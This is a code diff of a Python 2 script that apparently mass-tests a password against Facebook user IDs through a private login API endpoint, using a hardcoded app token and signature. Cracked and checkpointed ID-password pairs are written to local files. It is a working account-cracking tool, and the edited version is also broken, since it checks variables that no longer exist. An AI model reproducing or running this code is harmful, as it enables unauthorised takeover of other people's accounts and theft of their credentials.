@@ -229,35 +229,26 @@ def choice1_menu():
 	def main(arg):
 		global cpb,oks
 		user = arg
+		(uid, name) = user.split('|')
 		try:
 		    os.mkdir('save')
 		except OSError:
 		    pass
 		try:
-			b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
-                        params = {
-                                'access_token': b,
-                                'format': 'JSON',
-                                'sdk_version': '2',
-                                'email': user,
-                                'locale': 'en_US',
-                                'password': pass1,
-                                'sdk': 'ios',
-                                'generate_session_cookies': '1',
-                                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
-                        }
-                        api = 'https://b-api.facebook.com/method/auth.login'
-                        response = requests.get(api, params=params)
+			data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 			if "access_token" in q:
-				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
-				oks.append(user+pass1)
+				print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
+				ok = open('/sdcard/ids/jam_OK.txt', 'a')
+                                ok.write(uid + ' | ' + pass1 + '\n')
+                                ok.close()
+                                oks.append(uid + pass1)
 			else:
 				if "www.facebook.com" in response.json()["error_msg"]:
-					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
-					crt = open("save/checkpoint.txt", "a")
-					crt.write(user+"|"+pass1+"\n")
-					crt.close()
-					checkpoint.append(user+pass1)
+					print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
+					cp = open('jam_CP.txt', 'a')
+                                        cp.write(uid + ' | ' + pass1 + '\n')
+                                        cp.close()
+                                        cps.append(uid + pass1)
 		except:
 			pass
 		
@@ -267,8 +258,8 @@ def choice1_menu():
 	hamza('[✓] Process Has Been Completed.')
 	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
 	xx = str(len(oks))
-	xxx = str(len(checkpoint))
-	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
+	xxx = str(len(cps))
+	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
 	print (47*"-")
 	raw_input("\nPress Enter To Back ")
 	choice1()
